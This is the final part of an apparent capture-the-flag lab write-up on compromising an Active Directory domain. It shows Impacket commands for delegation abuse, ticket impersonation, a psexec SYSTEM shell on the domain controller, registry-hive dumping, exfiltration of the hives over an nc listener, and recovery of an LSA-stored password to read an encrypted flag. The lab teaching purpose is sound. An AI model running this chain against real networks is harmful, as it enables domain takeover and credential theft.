  -dc-ip 192.168.125.128 -hashes ":$JOPS_NT" \
  -delegate-from 'RPGPWN01$' -delegate-to 'SHINRA$' -action read
~~~

Output:

~~~text
[*] Successfully added machine account RPGPWN01$ with password RPGpwn_2026!.
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] RPGPWN01$ can now impersonate users on SHINRA$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     RPGPWN01$ (S-1-5-21-2284550090-1208917427-1204316795-13101)
~~~

**Why RBCD works here:** We control `RPGPWN01$` and its password, while Jops can modify the SHINRA computer object. Writing the resource-based constrained delegation security descriptor on **SHINRA** authorizes `RPGPWN01$` to request service tickets there on behalf of another user. Jops gains no new group membership; the computer object's delegation policy changes.

The built-in Administrator account was sensitive to delegation. `aimee_adm` was a local administrator on Shinra and was not marked sensitive, so we requested a CIFS ticket impersonating her:

~~~bash
impacket-getST -dc-ip 192.168.125.128 \
  -spn cifs/shinra.roundsoft.local \
  -impersonate aimee_adm \
  'roundsoft.local/RPGPWN01$:RPGpwn_2026!'
~~~

Output:

~~~text
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating aimee_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in aimee_adm@cifs_shinra.roundsoft.local@ROUNDSOFT.LOCAL.ccache
~~~

`S4U2Self` and `S4U2Proxy` produced a service ticket for `cifs/shinra.roundsoft.local`. We used that ticket for SMB and remote service creation with Impacket psexec. The FQDN in the target matches the ticket's service name; `-target-ip` makes the TCP connection directly to the DC.

~~~bash
cd /home/zendeni/RPG
export KRB5CCNAME="$PWD/aimee_adm@cifs_shinra.roundsoft.local@ROUNDSOFT.LOCAL.ccache"
impacket-psexec -k -no-pass \
  -dc-ip 192.168.125.128 \
  -target-ip 192.168.125.128 \
  'roundsoft.local/aimee_adm@shinra.roundsoft.local'
~~~

Output:

~~~text
[*] Found writable share ADMIN$
[*] Uploading file IXXCEUmy.exe
[*] Creating service iaia on 192.168.125.128
[*] Starting service iaia
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> hostname
Shinra
~~~

The CIFS ticket and Aimee's administrative rights permitted psexec to install a temporary service. That service's shell ran as local SYSTEM on the domain controller. The lab intermittently resets accounts and permissions, so the machine account and RBCD ACL may need to be reapplied if repeating this chain later.

## 7. EFS and the sixth flag

SYSTEM could access Shinra's files but could not decrypt the final EFS-protected file:

~~~cmd
type C:\Users\Administrator\Desktop\flag.txt
cipher /c C:\Users\Administrator\Desktop\flag.txt
~~~

Output:

~~~text
Access is denied.
E flag.txt
Users who can decrypt:
    ROUNDSOFT\administrator [Administrator(Administrator@ROUNDSOFT)]
    Certificate thumbprint: 16A9 1FEC A238 8E2E 7A96 453C B199 D60F B465 6625
No recovery certificate found.
The specified file could not be decrypted.
~~~

SYSTEM's local privileges do not substitute for the private key associated with Administrator's EFS certificate. We needed an access path authenticated as that account. Check the LSA secrets for a plaintext `DefaultPassword`. Export the SYSTEM and SECURITY registry hives for offline Impacket parsing:

~~~cmd
reg save HKLM\SYSTEM C:\Windows\Temp\shinra-system.hiv /y
reg save HKLM\SECURITY C:\Windows\Temp\shinra-security.hiv /y
~~~

Both saves returned `The operation completed successfully.` Impacket psexec's `lget` opens a **second** SMB connection; it failed with `KDC_ERR_PREAUTH_FAILED` and then `STATUS_USER_SESSION_DELETED`. The already-open SYSTEM shell remained usable. We compressed the two hives on Shinra:

~~~cmd
powershell -NoProfile -Command "Compress-Archive -Path 'C:\Windows\Temp\shinra-system.hiv','C:\Windows\Temp\shinra-security.hiv' -DestinationPath 'C:\Windows\Temp\shinra-hives.zip' -Force"
dir C:\Windows\Temp\shinra-hives.zip
~~~

~~~text
shinra-hives.zip  2239835 bytes
~~~

A direct TCP connection from Shinra to Kali `<KALI_IP>:8004` timed out. `sshuttle` let Kali initiate connections **into** the private network; it did not make Kali's tun0 address reachable in the other direction from every internal host. Ignis was on the same private subnet as Shinra and reachable on `192.168.125.135`, so we staged the ZIP there:

~~~bash
# Kali terminal: execute a receiver on Ignis; leave it listening
ssh -i /home/zendeni/RPG/beta_user.key beta_user@10.13.38.18 \
  'nc -lvnp 8006 > /tmp/shinra-hives.zip'
~~~

~~~cmd
rem In the existing Shinra SYSTEM shell:
powershell -NoProfile -Command "$ErrorActionPreference='Stop';$c=[Net.Sockets.TcpClient]::new('192.168.125.135',8006);$f=[IO.File]::OpenRead('C:\Windows\Temp\shinra-hives.zip');try{$f.CopyTo($c.GetStream())}finally{$f.Dispose();$c.Dispose()}"
~~~

Output on Ignis:

~~~text
Listening on [0.0.0.0] (family 0, port 8006)
Connection from 192.168.125.128 59177 received!
~~~

Copy it from Ignis to Kali and parse the hives:

~~~bash
cd /home/zendeni/RPG
scp -i ./beta_user.key beta_user@10.13.38.18:/tmp/shinra-hives.zip .
unzip -t shinra-hives.zip
unzip -o shinra-hives.zip
impacket-secretsdump -system shinra-system.hiv \
  -security shinra-security.hiv LOCAL | tee shinra-secrets.txt
rg -n -i -C 3 'DefaultPassword' shinra-secrets.txt
~~~

Output:

~~~text
shinra-hives.zip 100% 2187KB
testing: shinra-system.hiv   OK
testing: shinra-security.hiv OK
No errors detected in compressed data
[*] Target system bootKey: 0x4cdd15afd7a36ff806a3412b763df0c1
[*] Dumping LSA Secrets
[*] DefaultPassword
(Unknown User):SimianThrash_xiv14
~~~

The LSA entry provided a password but displayed `Unknown User`. The successful authentication below confirmed it belonged to Administrator. That account was a member of **Protected Users**, preventing the usual NTLM password authentication from an external SMB client. From the **AThompson Evil-WinRM session on domain-joined Gelus**, mount Shinra's administrative share by hostname as `roundsoft\administrator`. This path can use domain Kerberos authentication and read the EFS file as the authorized user:

~~~powershell
# On GELUS, in the existing AThompson Evil-WinRM session:
hostname
net use X: \\shinra\C$ /user:roundsoft\administrator SimianThrash_xiv14
Get-Content 'X:\Users\Administrator\Desktop\flag.txt'
~~~

Output:

~~~text
GELUS
The command completed successfully.
RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
~~~

That completed all six objectives.

**Flag:** `RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}`

## What made this route work

| Transition | Concrete permission or mistake | Proof |
| --- | --- | --- |
| External → internal files | Artifactory imported an internal UNC path | HTTP 200 import response and copied development files |
| Internal files → Ignis | Encrypted token plus .NET client; Rocket.Chat key attachment | Decrypted API token and beta_user SSH login |
| Ignis → Lux | Leaked default workstation password | Janderson WinRM Pwn3d on Lux |
| Lux → Ignis root | Live PuTTY SSH process could be hijacked | PuttyRider root shell and flag |
| Ignis root → Ruby secrets | Active GNOME session/keyring | Ruby password, keyring flag, Workstation/Drive secrets |
| Lux → Gelus | Rrodriguez's explicit credential enabled remote WMI process creation | WMI ReturnValue 0; Gelus reverse shell |
| Gelus → Ruby admin password | LastPass local vault protected by reused Drive password | Vault result and ruby_adm LDAP authentication |
| Ruby admin → KReid → Yamano | Rights over disabled KReid; Developers local admin; reversible WinSCP password | KReid WinRM and Yamano token with Infra |
| Yamano → AThompson | Writable PAC redirected proxy authentication; offline NetNTLMv2 crack | Responder capture and recovered password |
| Gelus → Shinra | Jops hash and GenericWrite on SHINRA enabled RBCD | S4U ticket, psexec SYSTEM shell |
| SYSTEM → final flag | Administrator EFS key required; LSA DefaultPassword enabled proper account access | Access denied as SYSTEM, successful read via Gelus |

## References

- [Impacket psexec source](https://github.com/fortra/impacket/blob/master/examples/psexec.py) for the ticket flags and `lget` secondary SMB transfer.
- [Impacket secretsdump source](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) for offline SYSTEM/SECURITY parsing.
- [bloodyAD user guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide) for `remove uac` and `set password` syntax.
- [WinSCP saved-password FAQ](https://winscp.net/eng/docs/faq_password) for the recoverability of saved sessions without a master password.
